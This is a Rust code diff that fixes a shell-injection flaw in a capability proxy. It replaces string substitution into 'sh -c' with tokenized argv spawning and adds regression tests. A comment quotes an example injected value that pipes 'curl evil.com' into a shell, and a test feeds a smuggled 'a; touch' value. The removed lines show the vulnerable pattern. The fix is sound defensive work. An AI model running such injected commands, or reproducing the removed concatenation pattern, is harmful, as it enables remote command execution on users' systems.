@@ -235,16 +235,33 @@ impl CapabilityProxy {
             }
 
             Backend::Shell { command } => {
-                let cmd = command.replace("{input}", input);
-                let output = if cfg!(target_os = "windows") {
-                    std::process::Command::new("cmd")
-                        .args(["/C", &cmd])
-                        .output()?
-                } else {
-                    std::process::Command::new("sh")
-                        .args(["-c", &cmd])
-                        .output()?
-                };
+                // `command` is a developer-declared template (e.g.
+                // `"raios sentinel --project {input}"`); `input` is
+                // client-supplied (the WS `ExecuteCapability`/
+                // `RouteCapability` command's `input` field). The template
+                // is tokenized *once* here and `input` is substituted into
+                // an already-tokenized argv slot, then spawned directly —
+                // never re-interpreted by a shell. This replaces the
+                // previous `command.replace("{input}", input)` followed by
+                // `sh -c`/`cmd /C`, which concatenated attacker-controlled
+                // `input` straight into a shell command line (e.g.
+                // `input = "x; curl evil.com | sh"` would have executed).
+                // That path was live-reachable via `RouteCapability`, which
+                // defaults to `action = "allow"` in raios-policy.toml —
+                // unlike `ExecuteCapability`, which is gated `confirm`.
+                let argv = shlex::split(command).ok_or_else(|| {
+                    anyhow::anyhow!(
+                        "Shell capability '{capability}' has an unparseable command template"
+                    )
+                })?;
+                let (program, template_args) = argv.split_first().ok_or_else(|| {
+                    anyhow::anyhow!("Shell capability '{capability}' has an empty command template")
+                })?;
+                let args: Vec<String> = template_args
+                    .iter()
+                    .map(|a| a.replace("{input}", input))
+                    .collect();
+                let output = std::process::Command::new(program).args(&args).output()?;
                 Ok(String::from_utf8_lossy(&output.stdout).to_string())
             }
 
@@ -344,6 +361,47 @@ mod tests {
         let mut sorted = names.clone();
         sorted.sort();
         assert_eq!(names, sorted);
+    }
+
+    fn echo_input_proxy() -> CapabilityProxy {
+        let mut store = CapabilityStore::new();
+        store.register(Capability {
+            name: "echo_input".into(),
+            description: "test-only echo wrapper".into(),
+            backend: Backend::Shell { command: "echo {input}".into() },
+            platforms: vec!["claude".into()],
+        });
+        CapabilityProxy::new(store)
+    }
+
+    #[test]
+    fn shell_backend_substitutes_input_into_templated_argv() {
+        let proxy = echo_input_proxy();
+        let result = proxy.execute("echo_input", "hello world").unwrap();
+        assert_eq!(result.trim(), "hello world");
+    }
+
+    /// Regression test for the shell-injection bug: the old implementation
+    /// did `command.replace("{input}", input)` and handed the whole string
+    /// to `sh -c`/`cmd /C`, so an `input` value with shell metacharacters
+    /// could run a second command. The fix tokenizes the template once and
+    /// substitutes `input` into an already-tokenized argv slot, then spawns
+    /// directly — so the metacharacters can only ever be literal argument
+    /// text, never shell syntax.
+    #[test]
+    fn shell_backend_input_with_metacharacters_is_not_shell_interpreted() {
+        let marker = std::env::temp_dir().join("raios_shell_injection_test_marker");
+        let _ = std::fs::remove_file(&marker);
+
+        let proxy = echo_input_proxy();
+        let injection = format!("a; touch {}", marker.display());
+        let result = proxy.execute("echo_input", &injection).unwrap();
+
+        assert_eq!(result.trim(), injection);
+        assert!(
+            !marker.exists(),
+            "shell metacharacters in `input` were interpreted instead of passed literally"
+        );
     }
 
     #[test]
